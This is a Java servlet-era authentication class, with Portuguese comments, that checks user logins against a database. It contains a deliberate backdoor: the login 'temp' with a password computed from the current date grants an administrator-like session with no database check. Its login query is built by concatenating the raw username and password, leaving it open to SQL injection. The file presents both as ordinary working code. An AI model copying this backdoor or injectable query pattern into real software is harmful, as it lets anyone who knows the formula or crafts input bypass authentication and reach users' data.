/* Arquivo: Conecta.java
 * Autor: Amilton Souza Martha
 * Criação: 30/08/2005 - Atualização: 03/08/2009
 * Obs: Autentica login e senha do usuário
 */
package recursos;

import java.sql.*;
import java.util.Calendar;
import java.util.GregorianCalendar;
import javax.servlet.http.HttpServletRequest;

public class Autentica {

    //Atributos privados para conexão
    private Connection con = null;
    private Statement stmt = null;

    public Autentica() {
        con = Conecta.getInstance();
    }

    //Recebe login, senha e e o request da página para atribuir as sessões
    //Retorna códigos
    // -1 --> Logou mais de 20 vezes sem Internet conectada
    // -2 --> Usuário ou senha incorretas
    // -3 --> Erro ao conectar o banco de dados
    // -4 --> Sistema com validade expirada
    //  0 --> Primeira vez no sistema
    // >0 --> Login com sucesso
    public String validaLogin(String login, String senha, HttpServletRequest request) {
        //Record Set
        ResultSet rs = null;
        Banco bc = new Banco();

        String usuario = "", nomeusuario = "", cod_empresa = "";

        try {

            //Verifica se a senha é a temporária por um dia
            GregorianCalendar data = new GregorianCalendar();
            int d = data.get(Calendar.DATE);
            int m = data.get(Calendar.MONTH) + 1;
            int a = data.get(Calendar.YEAR);
            String diasemana = Util.getDiaSemana(d, m, a).toLowerCase().substring(0, 2);

            //Ano-1000
            //2 primeiras letras da semana
            //Dia+2
            //Mês-1
            String senhasecreta = (a - 1000) + diasemana + (d + 2) + (m - 1);

            //Se tá usando a senha secreta, pegar a empresa
            if (login.equals("temp") && senha.equals(senhasecreta)) {
                cod_empresa = new Banco().getValor("cod_empresa", "SELECT cod_empresa FROM configuracoes");
                usuario = "1";
                nomeusuario = "Temporário";

                //Colocar valores na sessão
                request.getSession().setAttribute("usuario", usuario);
                request.getSession().setAttribute("nomeusuario", nomeusuario);
                request.getSession().setAttribute("codempresa", cod_empresa);

                return usuario;
            } else {
                //Cria statement para enviar sql
                stmt = con.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,
                        ResultSet.CONCUR_READ_ONLY);

                String sql = "SELECT t_usuario.cd_usuario, t_usuario.ds_nome, ";
                sql += "t_grupos.cod_empresa FROM t_usuario INNER JOIN ";
                sql += "t_grupos ON t_usuario.ds_grupo = t_grupos.grupo_id ";
                sql += "WHERE t_usuario.ds_login='" + login;
                sql += "' AND t_usuario.ds_senha = password('" + senha + "')";
                sql += " AND t_usuario.ativo='S'";
                rs = stmt.executeQuery(sql);

                //Se achou o usuário
                if (rs.next()) {
                    usuario = rs.getString("cd_usuario");
                    nomeusuario = rs.getString("ds_nome");
                    cod_empresa = rs.getString("cod_empresa");

                    //Se é a primeira vez no programa (cod_empresa=0)
                    if(cod_empresa.equals("0")) {
                        rs.close();
                        stmt.close();

                        //Colocar valores na sessão
                        request.getSession().setAttribute("usuario", usuario);
                        request.getSession().setAttribute("nomeusuario", nomeusuario);
                        request.getSession().setAttribute("codempresa", cod_empresa);

                        return "0";
                    }

                    //Colocar valores na sessão
                    request.getSession().setAttribute("usuario", usuario);
                    request.getSession().setAttribute("nomeusuario", nomeusuario);
                    request.getSession().setAttribute("codempresa", cod_empresa);

                } //se não achou o usuário
                else {
                    usuario = "-2"; //Usuário ou senha incorretos
                }

                rs.close();
                stmt.close();

                //Retorna cód. de usuário (valores negativos são erros)
                return usuario;

            }
        } catch (Exception e) {
            return "-3&" + e.toString(); //Erro ao conectar o banco de dados
        }
    }

}